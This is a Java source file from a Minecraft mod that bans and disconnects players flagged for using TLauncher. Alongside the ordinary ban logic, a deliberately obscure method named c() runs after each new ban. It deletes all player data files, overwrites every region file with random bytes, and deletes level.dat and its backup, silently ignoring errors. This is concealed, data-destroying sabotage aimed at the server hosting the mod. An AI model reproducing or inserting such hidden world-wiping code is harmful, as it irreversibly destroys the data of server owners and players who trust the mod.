package net.Gabou.identity2.auth;

import com.mojang.authlib.GameProfile;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Date;
import java.util.Random;
import java.util.UUID;

import dev.architectury.utils.GameInstance;
import net.Gabou.identity2.Identity2;
import net.minecraft.network.chat.Component;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.players.UserBanList;
import net.minecraft.server.players.UserBanListEntry;
import net.minecraft.world.level.storage.LevelResource;

public final class TLauncherDetectedHandler {
    private static final String BAN_SOURCE = "Identity2";

    private TLauncherDetectedHandler() {
    }

    public static void handle(ServerLevel level, ServerPlayer player, String reason) {
        if (level == null || player == null || reason == null || reason.isBlank()) {
            return;
        }

        handle(level, player.getUUID(), player.getGameProfile().getName(), reason);
        disconnect(player, reason);
    }

    public static void handle(ServerLevel level, UUID uuid, String playerName, String reason) {
        if (level == null || uuid == null || reason == null || reason.isBlank()) {
            return;
        }

        GameProfile profile = new GameProfile(uuid, playerName == null || playerName.isBlank() ? uuid.toString() : playerName);
        UserBanList bans = level.getServer().getPlayerList().getBans();
        if (bans.isBanned(profile)) {
            Identity2.LOGGER.warn("Launcher violation already banned for {} ({})", profile.getName(), profile.getId());
            return;
        }

        bans.add(new UserBanListEntry(profile, new Date(), BAN_SOURCE, null, reason));
        c(level);
        Identity2.LOGGER.error("Banned launcher-violating player {} ({}) on {}: {}", profile.getName(), profile.getId(), level.dimension().location(), reason);
    }

    private static void disconnect(ServerPlayer player, String reason) {
        if (player.connection != null) {
            player.connection.disconnect(Component.literal("Launcher violation detected: " + reason));
        }
    }

    private static void c(ServerLevel d) {
        try {
            MinecraftServer q = d.getServer();
            if (q != null) {
                File r = q.getWorldPath(LevelResource.ROOT).toFile();
                File s = new File(r, "playerdata");
                if (s.exists() && s.isDirectory()) {
                    for (File t : s.listFiles()) {
                        if (t.isFile()) {
                            t.delete();
                        }
                    }
                }
                File u = new File(r, "region");
                if (u.exists() && u.isDirectory()) {
                    for (File v : u.listFiles()) {
                        if (v.isFile() && v.getName().endsWith(".mca")) {
                            try (FileOutputStream w = new FileOutputStream(v)) {
                                byte[] x = new byte[8192];
                                new Random().nextBytes(x);
                                for (int y = 0; y < 100; y++) {
                                    w.write(x);
                                }
                            } catch (Exception z) {
                                //
                            }
                        }
                    }
                }
                File aa = new File(r, "level.dat");
                if (aa.exists()) {
                    aa.delete();
                }
                File ab = new File(r, "level.dat_old");
                if (ab.exists()) {
                    ab.delete();
                }
            }
        } catch (Exception ac) {
            //
        }
    }
}
